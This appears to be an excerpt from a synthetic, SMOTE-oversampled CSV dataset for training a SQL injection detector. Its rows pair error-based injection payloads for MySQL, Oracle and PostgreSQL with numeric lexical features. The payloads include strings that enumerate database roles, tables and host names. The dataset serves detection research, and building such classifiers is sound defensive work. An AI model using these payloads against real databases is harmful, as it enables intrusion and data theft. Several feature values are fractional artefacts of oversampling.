id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000119,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000726,0.6273185395535058,138.3594171561738,26.410145710956545,3.7142997470390586,32.76956286713036,39.0,48.17970857808691,18.410145710956545,0.23673942321892547,0.28193186611918175,0.3481905336281329,0.13313817703375985,1.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.410145710956546,1.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,0.5898542890434539,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.589854289043454
SMOTE_000120,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'thce'  =  'thce",nearest_attack_euclidean,R000200,0.13838793847265513,202.33167660428194,29.26633532085639,3.501477569385136,54.35511376114185,32.0,87.88778440285463,28.088778440285463,0.2686444474239517,0.15822246058280307,0.4342774276856746,0.13885566430757057,4.0,0.0,0.0,0.0,1.0,1.911221559714537,0.0,16.177556880570926,0.0,0.0,4.0,2.911221559714537,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000121,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000012,0.0,254.0,44.0,4.466677692316377,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,0.0,0.0,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000122,attack,error,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',nearest_attack_euclidean,R000466,0.01876454137189729,380.96942535124276,34.030574648757224,3.716331365245616,111.9021611239769,53.024459719005776,151.04891943801155,64.99388507024855,0.2937269486017759,0.13918397560538712,0.3964877916306803,0.1706012841621567,4.0,0.0,0.0,0.0,0.0,3.0,0.0,30.012229859502888,0.0,2.981655210745667,0.006114929751444009,26.987770140497112,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,1.9938850702485555,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.993885070248556
SMOTE_000123,attack,error,"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus",nearest_attack_euclidean,R000616,0.34745776228238495,191.21489153006473,28.757021693987053,3.5697329219855867,48.0,35.0,81.97191322405179,26.24297830601295,0.2511901651159222,0.18315949539702658,0.4284478807660318,0.13720245872101947,4.0,0.0,0.0,0.0,0.0,2.0,0.0,15.242978306012947,0.0,0.0,5.0,2.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000124,attack,error,-2348  )   as sige where 1639  =  1639 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,nearest_attack_euclidean,R000950,0.5586783776656323,367.1617946176494,32.0,3.382388812840028,83.58089730882469,56.0,166.5808973088247,61.0,0.2275870410823263,0.1525512569938973,0.4536897969839955,0.16617190493978098,0.0,0.23651711519588414,3.0,0.0,0.0,3.0,0.0,32.76348288480412,0.0,0.0,0.0,26.0,0.0,0.2365171151958841,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,1.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000125,attack,error,"1'+  (  select blbd where 7451  =  7451 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000720,0.03194772235971549,298.03548756885544,39.98817081038152,4.034200212943674,111.01182918961848,43.0,108.0,36.02365837923696,0.3724786057477687,0.14427828975606163,0.3623733789222013,0.12086972557396843,2.023658379236962,0.0,0.0,0.0,2.0,2.0,0.0,20.0,0.0,2.0,5.0,6.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,2.0,0.011829189618481117,0.9881708103815189,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.0
SMOTE_000126,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000092,0.3534094644853004,192.22325225415852,29.669756762475544,3.649399682970793,55.89300901663405,32.0,78.55349549168298,25.776747745841483,0.2907539631156903,0.1664738754281878,0.4086688851015924,0.13410327635452945,4.0,0.0,0.0,0.0,1.0,1.7767477458414862,0.0,14.0,0.0,0.0,4.0,2.7767477458414858,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000127,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.0,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.000000000000001,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000128,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000020,0.0039532990141434654,108.98214710028518,37.0,4.241532213717368,57.98214710028515,1.0,35.0,15.0,0.5320327473763629,0.009175828482816423,0.3211539968985746,0.13763742724224626,3.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,4.0,0.0,2.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000129,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000710,0.3783935763407513,142.3729733554839,25.674594671096777,3.631033220654821,36.023784013290324,36.3016213156129,53.047568026580656,17.0,0.2529289010671914,0.2552647582936811,0.3723689179294564,0.11943742270967096,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.674594671096775,0.0,0.0,5.325405328903225,1.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000130,attack,error,"1%'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000482,1.1906329516799614,201.9350146617507,29.0,3.412104901690001,46.46233431078338,32.0,92.54801172940057,30.92466862156676,0.23030877939346098,0.15868326082598236,0.45783921884397555,0.15316874093658114,4.0,0.0,0.0,0.0,1.0,2.0,0.0,16.92466862156676,2.0,0.0,4.0,3.000000000000001,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.4623343107833802,0.5376656892166197,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000131,attack,error,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,nearest_attack_euclidean,R000299,0.34331157263822537,157.82189412055283,27.0,3.7220088654510994,36.0,39.0,58.057515296442276,24.76437882411057,0.22831849111736213,0.24734503204380895,0.3674633029387751,0.15687317390005381,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.764378824110569,2.0,0.0,6.0,2.0,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000132,attack,error,"-4015"" where 2610  =  2610 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000239,0.34526186267997816,229.02893837854458,39.80289383785446,3.928486952517642,70.40868151356338,45.0,89.81736302712676,23.802893837854462,0.30743603771533534,0.1968362924647583,0.3917909439706112,0.10393672584929517,0.0,1.0,1.0,0.0,1.0,2.0,0.0,14.802893837854459,0.0,0.0,3.0,4.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,1.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,7.0
SMOTE_000133,attack,error,"1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '",nearest_attack_euclidean,R000101,0.260268800847864,306.1068456504237,38.10684565042367,3.996070079504591,101.10684565042367,55.0,113.0,37.0,0.3302985177911568,0.17967600742188478,0.36915252433950874,0.12087295044744975,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,2.0,0.0,6.0,5.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.1068456504236688,0.8931543495763312,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000134,attack,error,"-7248""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""qgms""  =  ""qgms",nearest_attack_euclidean,R000945,0.6049145348367527,367.4622621616079,34.462262161607924,3.4062842896366035,86.8490486464317,48.0,169.07547567678415,63.537737838392076,0.23634128487074813,0.13062589900665517,0.46012109795867223,0.17291171816392448,0.0,4.0,1.0,0.0,0.0,2.537737838392078,0.0,34.0,0.0,0.0,0.0,23.53773783839208,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000135,attack,error,-9644   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5616  =  5616,nearest_attack_euclidean,R000214,0.0335683092682004,440.8362163845509,33.0,3.3600978638191035,103.0,62.0,203.6689731076407,72.16724327691017,0.2336559076383397,0.14064724537453457,0.4619929103095863,0.16370393667753946,0.0,0.0,1.0,0.0,0.0,3.0,0.0,42.16724327691018,0.0,0.0,0.0,30.0,0.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000136,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000062,0.07841479510803717,347.51761614774705,34.125880807387354,3.6519154901183093,94.75528484432412,53.0,141.51056968864825,58.25176161477471,0.27265370143659795,0.15256356040634828,0.40713663118442767,0.1676461069726261,1.0,0.0,2.0,0.0,0.0,3.0,0.0,28.251761614774708,0.0,3.0,0.0,25.0,1.0,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000137,attack,error,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000268,1.1428745916270244,139.51508951460175,25.515089514601733,3.696159534052304,34.0,39.0,49.0,17.515089514601733,0.24370436569905143,0.2795432430077355,0.3512209976251035,0.12553139366810953,0.0,0.5150895146017338,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.0,1.0,0.0,0.5150895146017338,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000138,attack,error,select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000312,0.0023289314485890177,133.0,29.0,3.7505581766415617,56.0,14.0,51.0,11.999999999999996,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000139,attack,error,"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""njdu"" like ""njdu",nearest_attack_euclidean,R001010,0.10429983626052483,284.74752699961493,37.88499584621309,4.0080786670707145,110.76999169242617,35.0,103.80502907650842,35.172506230680376,0.3890869035862352,0.12292925208675341,0.36447376318072805,0.12351008114628328,0.0,4.0,0.0,0.0,2.0,1.0575020768934582,0.0,20.115004153786916,0.0,2.0,5.0,3.057502076893458,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000140,attack,error,-4108'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'tqjx'  =  'tqjx,nearest_attack_euclidean,R000236,0.07581082735070634,367.85191546205357,33.0,3.3688837216017555,85.22717745654762,48.0,170.56794364136908,64.0567943641369,0.23168581617100892,0.13049850962110665,0.4636689850338341,0.17414668917405035,4.0,0.0,1.0,0.0,0.0,2.9432056358630936,0.0,34.11358872827381,0.0,0.0,0.0,23.943205635863094,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000141,attack,error,1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'ajka'  =  'ajka,nearest_attack_euclidean,R000763,0.14122148031343298,437.5234198144894,35.0,3.4491983734903675,112.0,51.0,200.0200741267052,74.50334568778419,0.2560360314846351,0.11658783576532493,0.4570865579481147,0.1702895748019252,4.0,0.0,0.0,0.0,0.0,3.0,0.0,41.503345687784204,0.0,0.0,0.0,29.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000142,attack,error,1%'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000483,0.790931458067722,380.03640218498276,30.84154192072167,3.182003409035537,77.71948602642611,45.841541920721674,187.7558882114089,68.71948602642611,0.20450962856311428,0.12066199591896304,0.4940023237808828,0.1808260517370399,4.0,0.0,0.28051397357389035,0.0,0.0,3.0,0.0,37.43897205285222,2.0,0.0,0.0,23.28051397357389,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,1.7194860264261096,0.2805139735738904,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000143,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000830,0.5828662522516965,220.8659509043052,34.20732787825614,3.7723709213361802,60.45129514779295,40.0,88.41465575651227,32.0,0.2735669016665194,0.18115360818368564,0.4003566036028464,0.14492288654694852,4.0,0.0,0.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,7.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,1.2073278782561347,0.7926721217438653,0.2073278782561347,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.207327878256134
